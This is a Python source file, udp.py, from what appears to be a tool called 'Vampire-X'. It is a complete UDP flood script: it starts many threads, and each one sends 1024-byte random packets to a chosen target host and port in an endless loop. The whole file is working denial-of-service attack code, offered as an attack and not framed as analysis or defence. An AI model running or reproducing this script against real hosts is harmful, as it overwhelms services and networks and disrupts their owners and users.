# udp.py

import socket
import threading
import random
import time

def attack(target, port, threads):
    print(f"\n[UDP] Vampire-X UDP Attack started on {target}:{port} with {threads} threads\n")

    payload = random._urandom(1024)

    def udp_flood():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            try:
                s.sendto(payload, (target, port))
                print(f"[UDP] Packet sent to {target}:{port}")
                time.sleep(0.01)
            except Exception as e:
                print(f"[UDP] Error: {str(e)}")

    for _ in range(threads):
        t = threading.Thread(target=udp_flood)
        t.daemon = True
        t.start()
